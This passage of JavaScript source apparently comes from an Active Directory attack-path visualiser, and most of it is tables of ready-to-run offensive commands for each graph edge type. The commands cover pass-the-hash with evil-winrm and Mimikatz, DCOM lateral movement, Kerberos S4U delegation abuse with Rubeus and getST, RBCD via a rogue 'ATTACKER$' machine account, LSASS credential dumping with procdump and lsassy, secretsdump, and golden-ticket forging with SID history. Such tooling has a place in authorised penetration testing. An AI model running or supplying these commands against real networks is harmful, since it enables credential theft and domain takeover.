          { label: 'Mimikatz + mstsc — Restricted Admin mode via Pass-the-Hash',
            cmd: "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt-hash> /run:\"mstsc.exe /restrictedadmin /v:" + fqdn + "\"" },
        ]
      };
    }
  },

  { id: 'canpsremote', label: 'CanPSRemote — WinRM Access',
    blurb: 'The source principal has collected PowerShell Remoting access to the destination computer. The resulting session runs with that account’s permitted privilege and still depends on WinRM availability, network reachability, and endpoint policy.',
    appliesTo: function(e) { return /^CanPSRemote$/i.test(e.kind); },
    commands: function(e, from, to) {
      var fqdn = edgeFqdn(to);
      return {
        linux: [
          { label: 'evil-winrm — interactive WinRM shell',
            cmd: "evil-winrm -i " + fqdn + " -u '<user>' -p '<password>'" },
          { label: 'evil-winrm — Pass-the-Hash (no plaintext credential needed)',
            cmd: "evil-winrm -i " + fqdn + " -u '<user>' -H <nt-hash>" },
        ],
        windows: [
          { label: 'Enter-PSSession — interactive remote session',
            cmd: "Enter-PSSession -ComputerName " + fqdn + " -Credential (Get-Credential)" },
          { label: 'Invoke-Command — single-shot remote execution',
            cmd: "Invoke-Command -ComputerName " + fqdn + " -Credential (Get-Credential) -ScriptBlock { whoami; hostname }" },
        ]
      };
    }
  },

  { id: 'executedcom', label: 'ExecuteDCOM — DCOM Remote Execution',
    blurb: 'The source principal has a collected DCOM execution relationship to the destination computer. It represents a possible remote-execution route, subject to RPC reachability, DCOM configuration, token privilege, and endpoint controls.',
    appliesTo: function(e) { return /^ExecuteDCOM$/i.test(e.kind); },
    commands: function(e, from, to) {
      var fqdn = edgeFqdn(to);
      return {
        linux: [
          { label: 'dcomexec.py — DCOM lateral movement via MMC20.Application',
            cmd: "dcomexec.py -object MMC20 '<domain>/<user>:<password>@" + fqdn + "' 'cmd /c whoami'" },
          { label: 'dcomexec.py — ShellWindows object',
            cmd: "dcomexec.py -object ShellWindows '<domain>/<user>:<password>@" + fqdn + "' 'cmd /c whoami'" },
        ],
        windows: [
          { label: 'PowerShell — MMC20.Application DCOM lateral movement',
            cmd: "$c=[Activator]::CreateInstance([Type]::GetTypeFromProgID('MMC20.Application','" + fqdn + "')); $c.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c calc.exe','7')" },
          { label: 'PowerShell — ShellWindows DCOM object',
            cmd: "$c=[Activator]::CreateInstance([Type]::GetTypeFromProgID('Shell.Application','" + fqdn + "')); $c.ShellExecute('cmd','/c calc.exe','','open',0)" },
        ]
      };
    }
  },

  { id: 'allowedtodelegate', label: 'AllowedToDelegate — Constrained Delegation',
    blurb: 'The source principal is configured for Kerberos constrained delegation to a service associated with the destination. The edge identifies the permitted delegation target; account control, service configuration, protocol-transition settings, and protected-user restrictions determine what can actually be impersonated.',
    appliesTo: function(e) { return /^AllowedToDelegate$/i.test(e.kind); },
    commands: function(e, from, to) {
      var fromSam = edgeSam(from), fqdn = edgeFqdn(to), host = edgeHost(to), spn = 'cifs/' + host;
      return {
        linux: [
          { label: 'getST.py — S4U2Self + S4U2Proxy (impersonate Administrator)',
            cmd: "getST.py -spn '" + spn + "' -impersonate Administrator -dc-ip <dc-ip> '<domain>\\<delegating-account>:<password>'" },
          { label: 'getST.py — with NT hash if cracked or dumped',
            cmd: "getST.py -spn '" + spn + "' -impersonate Administrator -hashes :<nt-hash> -dc-ip <dc-ip> '<domain>\\<delegating-account>'" },
          { label: 'wmiexec.py — lateral movement using the forged ticket',
            cmd: "export KRB5CCNAME=Administrator.ccache && wmiexec.py -k -no-pass '<domain>/Administrator@" + fqdn + "'" },
        ],
        windows: [
          { label: 'Rubeus — S4U2Self + S4U2Proxy, output TGS',
            cmd: "Rubeus.exe s4u /user:" + fromSam + " /rc4:<ntlm-hash> /impersonateuser:Administrator /msdsspn:" + spn + " /nowrap" },
          { label: 'Rubeus — inject ticket and access target share',
            cmd: "Rubeus.exe ptt /ticket:<base64-ticket> && dir \\\\" + host + "\\c$" },
        ]
      };
    }
  },

  { id: 'allowedtoact', label: 'AllowedToAct — RBCD',
    blurb: 'The destination computer’s RBCD configuration allows the source principal to act on behalf of users to that computer. The relationship is useful only when the source account is controlled and the required Kerberos/SPN and target-service conditions are satisfied.',
    appliesTo: function(e) { return /^AllowedToAct$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), fqdn = edgeFqdn(to), host = edgeHost(to);
      return {
        linux: [
          { label: 'addcomputer.py — create rogue machine account (needs MachineAccountQuota > 0)',
            cmd: "addcomputer.py '<domain>/<user>:<password>' -method LDAPS -computer-name 'ATTACKER$' -computer-pass 'Attacker@123!' -dc-ip <dc-ip>" },
          { label: 'rbcd.py — write RBCD attribute to target computer',
            cmd: "rbcd.py -f 'ATTACKER' -t '" + s + "' -dc-ip <dc-ip> -action write '<domain>\\<user>:<password>'" },
          { label: 'getST.py — S4U2Self + S4U2Proxy (impersonate Administrator)',
            cmd: "getST.py -spn 'cifs/" + host + "' -impersonate Administrator -dc-ip <dc-ip> '<domain>\\ATTACKER$:Attacker@123!'" },
          { label: 'wmiexec.py — lateral movement with the forged ticket',
            cmd: "export KRB5CCNAME=Administrator.ccache && wmiexec.py -k -no-pass '<domain>/Administrator@" + fqdn + "'" },
        ],
        windows: [
          { label: 'PowerMad — create rogue machine account',
            cmd: "New-MachineAccount -MachineAccount ATTACKER -Password $(ConvertTo-SecureString 'Attacker@123!' -AsPlainText -Force)" },
          { label: 'Rubeus — S4U2Self + S4U2Proxy from rogue machine account',
            cmd: "Rubeus.exe s4u /user:ATTACKER$ /rc4:<ntlm-of-ATTACKER$> /impersonateuser:Administrator /msdsspn:cifs/" + host + " /nowrap" },
          { label: 'Rubeus — inject ticket and access target',
            cmd: "Rubeus.exe ptt /ticket:<base64-ticket> && dir \\\\" + host + "\\c$" },
        ]
      };
    }
  },

  { id: 'hassession', label: 'HasSession — Collected User Session',
    blurb: 'The destination user had a session on the source computer when session data was collected. The Computer → User direction represents possible credential or token traversal if the computer is controlled with sufficient privilege; it does not mean the computer logged on to the user. The session may now be stale, and recoverable credential material is not guaranteed.',
    appliesTo: function(e) { return /^HasSession$/i.test(e.kind); },
    commands: function(e, from, to) {
      var comp = (from && from.kind === 'Computer') ? from : to;
      var fqdn = edgeFqdn(comp);
      return {
        linux: [
          { label: 'NXC SMB — enumerate logged-on users (requires local admin)',
            cmd: "nxc smb " + fqdn + " -u '<user>' -p '<password>' --loggedon-users" },
          { label: 'NXC — lsassy module (in-memory LSASS dump)',
            cmd: "nxc smb " + fqdn + " -u '<user>' -p '<password>' -M lsassy" },
          { label: 'secretsdump.py — remote SAM + LSA + cached credential dump',
            cmd: "secretsdump.py '<domain>/<user>:<password>@" + fqdn + "'" },
        ],
        windows: [
          { label: 'Mimikatz — dump LSASS in-memory creds (on the target machine)',
            cmd: "sekurlsa::logonpasswords" },
          { label: 'Invoke-Command — run credential dump via PowerShell Remoting',
            cmd: "Invoke-Command -ComputerName " + fqdn + " -Credential (Get-Credential) -ScriptBlock { Invoke-Mimikatz -DumpCreds }" },
          { label: 'procdump — LSASS memory dump for offline parsing',
            cmd: "procdump.exe -accepteula -ma lsass.exe lsass.dmp  # then: pypykatz lsa minidump lsass.dmp" },
        ]
      };
    }
  },

  { id: 'hassidhistory', label: 'HasSIDHistory — SID History Abuse',
    blurb: 'The source account carries the destination principal’s SID in its sIDHistory attribute. The historical SID may add permissions to issued tokens, but effective access depends on existing ACLs and—across trusts—SID-filtering behavior.',
    appliesTo: function(e) { return /^HasSIDHistory$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(from), d = edgeDomain(from);
      return {
        linux: [
          { label: 'ldapsearch — read sIDHistory attribute',
            cmd: "ldapsearch -x -H ldap://<dc-ip> -D '<user>@" + d + "' -w '<password>' -b '" + domainToDN(d) + "' '(sAMAccountName=" + s + ")' sIDHistory" },
          { label: 'bloodyAD — inspect sIDHistory value',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> get object '" + s + "' --attr sIDHistory" },
          { label: 'psexec.py — PTH with this account to access SID-history-granted resources',
            cmd: "psexec.py -hashes :<nt-hash-of-" + s + "> '<domain>/" + s + "@<target-resource>'" },
        ],
        windows: [
          { label: 'PowerView — read sIDHistory',
            cmd: "Get-DomainUser -Identity '" + s + "' -Properties sidhistory | Select-Object -ExpandProperty sidhistory" },
          { label: 'Active Directory module — read sIDHistory',
            cmd: "Get-ADUser -Identity '" + s + "' -Properties sIDHistory | Select-Object sIDHistory" },
          { label: 'Mimikatz — forge ticket with SID history included in PAC',
            cmd: "kerberos::golden /user:" + s + " /domain:<domain> /sid:<domain-sid> /krbtgt:<krbtgt-hash> /sids:<sid-from-history> /ptt" },
        ]
      };
    }
  },

];

// Reuses the same panel DOM and findingCmdGroupHtml as node findings.
function renderEdgeFindingPanel(edge, fromNode, toNode) {
  var panel = byId('findingPanel');
  var match = null;
  for (var i = 0; i < EDGE_FINDINGS.length; i++) {
    if (EDGE_FINDINGS[i].appliesTo(edge, fromNode, toNode)) { match = EDGE_FINDINGS[i]; break; }
  }
  if (!match) { panel.style.display = 'none'; panel.innerHTML = ''; return; }
  var blurb = typeof match.blurb === 'function' ? match.blurb(edge, fromNode, toNode) : match.blurb;
  var cmds  = match.commands(edge, fromNode, toNode);
  panel.innerHTML =
    '<div class="findingHead">' +
      '<span class="findingDot"></span>' +
      '<span class="findingTitle">' + escapeHtml(match.label) + '</span>' +
      '<button type="button" class="findingClose" aria-label="Dismiss">\u00D7</button>' +
    '</div>' +
    '<div class="findingBlurb">' + escapeHtml(blurb) + '</div>' +
    '<div class="findingTabs">' +
      '<button type="button" class="findingTab active" data-os="linux">Linux</button>' +
      '<button type="button" class="findingTab" data-os="windows">Windows</button>' +
    '</div>' +
    '<div class="findingBody">' +
      findingCmdGroupHtml(cmds.linux,   'linux',   true)  +
      findingCmdGroupHtml(cmds.windows, 'windows', false) +
    '</div>';
  panel.style.display = 'flex';
}

function selectEdge(visEdgeId) {
  var entry = currentVisEdgeMap[visEdgeId];
  if (!entry) return;
  selectedNodeId = null;

  var e = entry.edge, fn = entry.fromNode, tn = entry.toNode;
  var fnKm = KIND_META[(fn && fn.kind) || 'Unknown'] || KIND_META.Unknown;
  var tnKm = KIND_META[(tn && tn.kind) || 'Unknown'] || KIND_META.Unknown;
  var catColor = (CAT_META[e.category] || CAT_META.structural).color;
  var explanation = relationshipExplanation(e, fn, tn);

  byId('inspector').innerHTML =
    '<div class="inspKindRow">' +
      '<span class="dot" style="background:' + catColor + '"></span> ' +
      escapeHtml(e.category.toUpperCase()) +
      (e.inherited ? ' <span class="tag tagStub">inherited</span>' : '') +
    '</div>' +
    '<div class="inspName">' + escapeHtml(e.kind) + '</div>' +
    '<div class="edgeEndpoints">' +
      '<span class="edgeEndpointRole">Source</span>' +
      '<span class="dot" style="background:' + fnKm.color + '"></span>' +
      '<span>' + escapeHtml(fn ? displayName(fn) : e.from) + '</span>' +
      '<span style="color:var(--accent);font-weight:600;">\u2192</span>' +
      '<span class="edgeEndpointRole">Destination</span>' +
      '<span class="dot" style="background:' + tnKm.color + '"></span>' +
      '<span>' + escapeHtml(tn ? displayName(tn) : e.to) + '</span>' +
    '</div>' +
    '<div class="edgeMeaning"><div class="edgeMeaningLabel">Plain-language meaning</div>' +
      '<div class="edgeMeaningText">' + escapeHtml(explanation.meaning) + '</div>' +
      '<div class="edgeDirectionNote">' + escapeHtml(explanation.direction) + '</div></div>';

  rememberInspectorState({ type: 'edge', edgeKey: edgeVariantKey(e) });
  renderEdgeFindingPanel(e, fn, tn);
  if (window.matchMedia && window.matchMedia('(max-width:860px)').matches) byId('sidebar').classList.add('mobileOpen');
}
